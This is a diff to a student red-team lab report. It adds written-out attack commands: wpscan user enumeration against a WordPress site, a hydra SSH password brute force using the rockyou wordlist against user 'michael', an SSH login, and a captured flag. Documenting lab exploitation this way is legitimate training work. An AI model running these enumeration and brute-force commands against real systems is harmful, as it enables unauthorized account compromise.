@@ -42,6 +42,8 @@ Other Vulnerabilities Include:
 ### Exploitation
 
 _WordPress User Enumeration_
+  -  Ran the command: wpscan --url http://192.168.1.110/wordpress --enumerate u
+     -  This allowed me to get a list of usernames
 
 ![wpscan](https://github.com/crashandmayhem/Final-Project/blob/main/Images/wpscan_1.png)
 
@@ -51,8 +53,18 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 - Target 1
   - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}
     - **_CVE-2021-28041_ Open SSH AND _Weak Password_**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+      - Ran a Brute Force Attack to obtain michael's password and then ssh into the server
+      - Command: hydra -l michael -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.110 -t 4 ssh
+      - Command: ssh michael@192.168.1.110
+
+![brute force](https://github.com/crashandmayhem/Final-Project/blob/main/Images/hydra_1.png)
+
+![brute force2](https://github.com/crashandmayhem/Final-Project/blob/main/Images/hydra_2.png)
+
+- SSH Michael
+
+![ssh michael](https://github.com/crashandmayhem/Final-Project/blob/main/Images/ssh%20michael.png)
+
   - `flag2.txt`: _TODO: Insert `flag2.txt` hash value_
     - **Exploit Used**
       - _TODO: Identify the exploit used_
